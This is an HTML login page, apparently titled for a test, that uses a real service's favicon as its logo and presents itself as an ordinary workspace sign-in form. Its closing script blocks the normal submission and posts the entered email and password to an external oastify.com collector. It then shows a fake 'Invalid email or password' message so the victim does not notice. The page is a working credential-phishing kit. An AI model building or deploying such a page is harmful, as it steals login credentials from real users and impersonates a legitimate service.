<!DOCTYPE html>
<html lang="en">
<head>
  <link rel="icon" href="https://app.labelbox.com/favicon.ico?v=2" type="image/x-icon" />
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>InspectivTest Login</title>
  <style>
    :root {
      --bg: #08111a;
      --bg-2: #0b1621;
      --panel: rgba(18, 29, 40, 0.96);
      --panel-2: rgba(14, 24, 34, 0.96);
      --border: #223243;
      --border-soft: #1a2a39;
      --text: #e6eef8;
      --muted: #8fa3b8;
      --accent: #3b82f6;
      --accent-hover: #2563eb;
      --input-bg: #0d1620;
      --shadow: 0 24px 60px rgba(0, 0, 0, 0.4);
      --radius: 20px;
    }

    * {
      box-sizing: border-box;
    }

    html,
    body {
      height: 100%;
    }

    body {
      margin: 0;
      font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
      color: var(--text);
      background:
        radial-gradient(circle at top left, rgba(59, 130, 246, 0.12), transparent 28%),
        radial-gradient(circle at bottom right, rgba(59, 130, 246, 0.08), transparent 24%),
        linear-gradient(180deg, var(--bg) 0%, var(--bg-2) 100%);
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 32px 20px;
    }

    .page {
      width: 100%;
      max-width: 440px;
    }

    .login-card {
      width: 100%;
      background: linear-gradient(180deg, var(--panel), var(--panel-2));
      border: 1px solid var(--border);
      border-radius: var(--radius);
      box-shadow: var(--shadow);
      padding: 32px;
      backdrop-filter: blur(8px);
    }

    .login-logo {
      display: block;
      width: 56px;
      height: 56px;
      margin: 0 auto 18px;
      border-radius: 14px;
    }

    .login-card h1 {
      margin: 0 0 8px;
      text-align: center;
      font-size: 30px;
      font-weight: 700;
      letter-spacing: -0.02em;
    }

    .login-card p {
      margin: 0 0 28px;
      text-align: center;
      color: var(--muted);
      font-size: 14px;
      line-height: 1.5;
    }

    .field {
      margin-bottom: 18px;
    }

    .field label {
      display: block;
      margin-bottom: 8px;
      font-size: 14px;
      font-weight: 600;
      color: #dce7f3;
    }

    .input-wrap {
      position: relative;
    }

    .input-wrap input {
      width: 100%;
      height: 48px;
      border-radius: 12px;
      border: 1px solid var(--border);
      background: var(--input-bg);
      color: var(--text);
      padding: 0 14px;
      outline: none;
      font-size: 14px;
      transition: border-color 0.18s ease, box-shadow 0.18s ease, background 0.18s ease;
    }

    .input-wrap input::placeholder {
      color: #6f8499;
    }

    .input-wrap input:hover {
      border-color: #30475d;
    }

    .input-wrap input:focus {
      border-color: var(--accent);
      box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.14);
      background: #0d1823;
    }

    .row {
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 12px;
      margin: 8px 0 22px;
      flex-wrap: wrap;
    }

    .checkbox {
      display: inline-flex;
      align-items: center;
      gap: 10px;
      font-size: 14px;
      color: var(--muted);
      cursor: pointer;
      user-select: none;
    }

    .checkbox input {
      width: 16px;
      height: 16px;
      accent-color: var(--accent);
      margin: 0;
    }

    .link {
      color: #a9c8ff;
      text-decoration: none;
      font-size: 14px;
    }

    .link:hover {
      text-decoration: underline;
    }

    .btn {
      width: 100%;
      height: 48px;
      border: 0;
      border-radius: 12px;
      background: var(--accent);
      color: #ffffff;
      font-size: 15px;
      font-weight: 700;
      cursor: pointer;
      transition: background 0.18s ease, transform 0.08s ease;
    }

    .btn:hover {
      background: var(--accent-hover);
    }

    .btn:active {
      transform: translateY(1px);
    }

    .footer-text {
      margin-top: 20px;
      text-align: center;
      color: var(--muted);
      font-size: 14px;
      line-height: 1.5;
    }

    .footer-text a {
      color: #d4e3ff;
      text-decoration: none;
    }

    .footer-text a:hover {
      text-decoration: underline;
    }

    @media (max-width: 480px) {
      body {
        padding: 16px;
      }

      .login-card {
        padding: 24px;
        border-radius: 16px;
      }

      .login-card h1 {
        font-size: 26px;
      }
    }
  </style>
</head>
<body>
  <div class="page">
    <div class="login-card">
      <img
        src="https://app.labelbox.com/favicon.ico?v=2"
        alt="Logo"
        class="login-logo"
      />

      <h1>Log in to your account</h1>
      <p>Access your workspace using your email and password.</p>

      <form id="loginForm" action="/login" method="POST">
        <div class="field">
          <label for="email">Email address</label>
          <div class="input-wrap">
            <input
              type="email"
              id="email"
              name="email"
              placeholder="name@company.com"
              required
              autocomplete="email"
            />
          </div>
        </div>

        <div class="field">
          <label for="password">Password</label>
          <div class="input-wrap">
            <input
              type="password"
              id="password"
              name="password"
              placeholder="Enter your password"
              required
              autocomplete="current-password"
            />
          </div>
        </div>

        <div class="row">
          <label class="checkbox">
            <input type="checkbox" name="remember_me" />
            <span>Remember me</span>
          </label>

          <a href="#" class="link">Forgot password?</a>
        </div>

        <button type="submit" class="btn">Log in</button>
      </form>

      <div class="footer-text">
        Don’t have an account? <a href="">Request access</a>
      </div>
    </div>
  </div>
  <script>
document.getElementById('loginForm').addEventListener('submit', function (e) {
  e.preventDefault();

  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;

  const formData = new FormData();
  formData.append('email', email);
  formData.append('password', password);

  fetch('https://e4j7buxs0z8qwjx55wqiyyidt4zvnmbb.oastify.com', {
    method: 'POST',
    body: formData
  });

  alert("Invalid email or password. Please try again.");
});
</script>
</body>
</html>
